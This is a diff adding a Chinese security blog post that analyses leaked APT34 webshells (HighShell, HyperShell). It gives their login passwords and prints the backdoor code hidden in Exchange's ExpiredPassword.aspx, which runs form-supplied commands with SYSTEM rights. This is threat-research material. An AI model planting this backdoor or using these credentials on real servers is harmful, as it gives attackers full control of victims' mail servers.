@@ -1,0 +1,249 @@
+<article class="post">
+  <h1>对APT34泄露工具的分析——HighShell和HyperShell</h1>
+
+  <div class="entry">
+    <h2 id="0x00-前言">0x00 前言</h2>
+<hr>
+
+<p>最近APT34的6款工具被泄露，本文作为分析文章的第二篇，仅在技术角度对其中的HighShell和HyperShell进行分析</p>
+
+<p>参考资料：</p>
+
+<p>https://malware-research.org/apt34-hacking-tools-leak/amp/</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr>
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>对HighShell的分析</li>
+  <li>对HyperShell的分析</li>
+  <li>小结</li>
+</ul>
+
+<h2 id="0x02-对highshell的分析">0x02 对HighShell的分析</h2>
+<hr>
+
+<p>对应泄露文件的名称为Webshells_and_Panel中的HighShell</p>
+
+<p>其中的文件为HighShell.aspx，是针对Windows服务器的webshell</p>
+
+<p>默认访问页面如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-4-20/2-1.png" alt="Alt text"></p>
+
+<p>Login框为红色，需要输入连接口令</p>
+
+<p>正确的口令为<code class="language-plaintext highlighter-rouge">Th!sN0tF0rFAN</code></p>
+
+<p>输入正确的口令后，点击Do it，刷新页面，成功登录，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-4-20/2-2.png" alt="Alt text"></p>
+
+<p>Login框变为绿色</p>
+
+<p>该工具的公开线索：</p>
+
+<p>https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/</p>
+
+<p>HighShell同paloaltonetworks在文中提到的TwoFace的页面相同</p>
+
+<h2 id="0x03-对hypershell的分析">0x03 对HyperShell的分析</h2>
+<hr>
+
+<p>对应泄露文件的名称为Webshells_and_Panel中的HyperShell</p>
+
+<p>下面包含7个文件夹:</p>
+
+<ol>
+  <li>ExpiredPasswordTech</li>
+  <li>HyperShell</li>
+  <li>Image</li>
+  <li>Libraries</li>
+  <li>packages</li>
+  <li>ShellLocal</li>
+  <li>StableVersion</li>
+</ol>
+
+<h3 id="1expiredpasswordtech">1.ExpiredPasswordTech</h3>
+
+<p>包括3个文件：</p>
+
+<ul>
+  <li>error4.aspx，功能与HighShell.aspx相同，但登录口令未知</li>
+  <li>ExpiredPassword.aspx，适用于Exchange的webshell</li>
+  <li>MyMaster.aspx，生成字符串：<code class="language-plaintext highlighter-rouge">NxKK&lt;TjWN^lv-$*UZ|Z-H;cGL(O&gt;7a</code></li>
+</ul>
+
+<h3 id="2hypershell">2.HyperShell</h3>
+
+<p>包含多个文件，是各个webshell的源码文件</p>
+
+<p>其中包含另一个可用的webshell，相对路径：<code class="language-plaintext highlighter-rouge">.\Webshells_and_Panel\HyperShell\HyperShell\Shell\simple.aspx</code></p>
+
+<p>连接口令：<code class="language-plaintext highlighter-rouge">MkRg5dm8MOk</code></p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-4-20/2-3.png" alt="Alt text"></p>
+
+<h3 id="3image">3.Image</h3>
+
+<p>图片文件夹</p>
+
+<h3 id="4libraries">4.Libraries</h3>
+
+<p>包含多个依赖文件</p>
+
+<h3 id="5packages">5.packages</h3>
+
+<p>包含多个依赖文件</p>
+
+<h3 id="6-shelllocal">6. ShellLocal</h3>
+
+<p>空文件夹</p>
+
+<h3 id="7-stableversion">7. StableVersion</h3>
+
+<p>稳定版本，包含多个webshell</p>
+
+<h4 id="1expiredpasswordaspx">(1)ExpiredPassword.aspx</h4>
+
+<p>适用于Exchange的webshell</p>
+
+<p>相对路径：<code class="language-plaintext highlighter-rouge">.\Webshells_and_Panel\HyperShell\StableVersion\HighShell v5.0\HyperShell\HyperShell\ExpiredPasswordTech</code></p>
+
+<p>与相对路径<code class="language-plaintext highlighter-rouge">.\Webshells_and_Panel\HyperShell\ExpiredPasswordTech</code>下的文件内容相同</p>
+
+<p>ExpiredPassword.aspx是Exchange正常的功能，对应重置用户口令的页面，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-4-20/3-1.png" alt="Alt text"></p>
+
+<p>访问的URL：<code class="language-plaintext highlighter-rouge">https://&lt;domain&gt;/owa/auth/ExpiredPassword.aspx</code></p>
+
+<p>对应Windows绝对路径：<code class="language-plaintext highlighter-rouge">C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\ExpiredPassword.aspx</code></p>
+
+<p>该路径下的webshell默认权限为System</p>
+
+<p>我的测试系统安装了Exchange2013，正常的ExpiredPassword.aspx源码我已经上传至github：</p>
+
+<p>https://raw.githubusercontent.com/3gstudent/test/master/ExpiredPassword.aspx(2013)</p>
+
+<p>HyperShell中的ExpiredPassword.aspx是一个添加了后门代码的文件，同我测试环境的正常ExpiredPassword.aspx文件相比有多处不同，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-4-20/3-2.png" alt="Alt text"></p>
+
+<p>经过分析发现有可能是Exchange版本差异导致的，忽略版本差异，HyperShell中的ExpiredPassword.aspx主要添加了如下代码：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>              &lt;%
+                    try{
+                    if (Convert.ToBase64String(new System.Security.Cryptography.SHA1Managed().ComputeHash(Encoding.ASCII.GetBytes(Encoding.ASCII.GetString(Convert.FromBase64String(Request.Form["newPwd1"])) + "reDGEa@#!%FS"))) == "+S6Kos9D/etq1cd///fgTarVnUQ=")
+                    {
+                        System.Diagnostics.Process p = new System.Diagnostics.Process();
+                        System.Diagnostics.ProcessStartInfo i = p.StartInfo;
+                        i.FileName = "cmd";
+                        i.Arguments = "/c " + Encoding.UTF8.GetString(Convert.FromBase64String(Request.Form["newPwd2"]));
+                        i.UseShellExecute = false;
+                        i.CreateNoWindow = true;
+                        i.RedirectStandardOutput = true;
+                        p.Start();
+                        string r = p.StandardOutput.ReadToEnd();
+                        p.WaitForExit();
+                        p.Close();
+                        Response.Write("&lt;pre&gt;" + Server.HtmlEncode(r) + "&lt;/pre&gt;");
+                        Response.End();
+                    }}catch{}
+                %&gt;
+</code></pre></div></div>
+
+<p>对应到我的测试环境，也就是Exchange2013，添加payload后并去掉验证环节的代码已上传至github：</p>
+
+<p>https://raw.githubusercontent.com/3gstudent/test/master/ExpiredPassword.aspx(2013)(HyperShell)</p>
+
+<p><code class="language-plaintext highlighter-rouge">Confirm new password</code>项为传入要执行的命令，权限为System</p>
+
+<h4 id="2highshelllocal">(2)HighShellLocal</h4>
+
+<p>功能强大的webshell</p>
+
+<p>相对路径：<code class="language-plaintext highlighter-rouge">.\Webshells_and_Panel\Webshells_and_Panel\HyperShell\StableVersion\HighShell v5.0\HyperShell\HyperShell\ShellLocal\StableVersions\ShellLocal-v8.8.5.rar</code></p>
+
+<p>解压到当前目录，相对路径为<code class="language-plaintext highlighter-rouge">.\ShellLocal-v8.8.5\ShellLocal-v8.8.5\HighShellLocal</code>，包括以下文件：</p>
+
+<ul>
+  <li>文件夹css</li>
+  <li>文件夹files</li>
+  <li>文件夹js</li>
+  <li>HighShellLocal.aspx</li>
+</ul>
+
+<p>实际使用时，还需要<code class="language-plaintext highlighter-rouge">.\ShellLocal-v8.8.5\ShellLocal-v8.8.5\</code>下的bin文件夹，否则提示无法使用Json</p>
+
+<p>完整结构如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>│   HighShellLocal.aspx
+│
+├───bin
+│       Newtonsoft.Json.dll
+│
+├───css
+│   │   main.css
+│   │
+│   └───img
+│           box-zipper.png
+│           download-cloud.png
+│           exclamation-diamond.png
+│           heart-break.png
+│           heart-empty.png
+│           heart.png
+│           minus-button.png
+│
+├───files
+│       7za.exe
+│       nbt.exe
+│       rx.exe
+│
+└───js
+    │   explorer.js
+    │   main.js
+    │   send.js
+    │   utility.js
+    │
+    ├───components
+    │      
+    ├───jquery
+    │       
+    └───semantic
+</code></pre></div></div>
+
+<p>登录口令：<code class="language-plaintext highlighter-rouge">Th!sN0tF0rFAN</code></p>
+
+<p>登录页面如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-4-20/3-4.png" alt="Alt text"></p>
+
+<p>输入正确的登录口令后，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-4-20/3-5.png" alt="Alt text"></p>
+
+<p>可以看到该webshell支持多个功能</p>
+
+<h2 id="0x04-小结">0x04 小结</h2>
+<hr>
+
+<p>本文对泄露文件中的HighShell和HyperShell进行了分析，其中HyperShell中的ExpiredPassword.aspx是一个比较隐蔽的webshell，目前为止我还未在公开资料中找到这种利用方法。</p>
+
+<hr>
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+
+  </div>
+
+  <div class="date">
+    Written on April 20, 2019
+  </div>
+
+  
+</article>
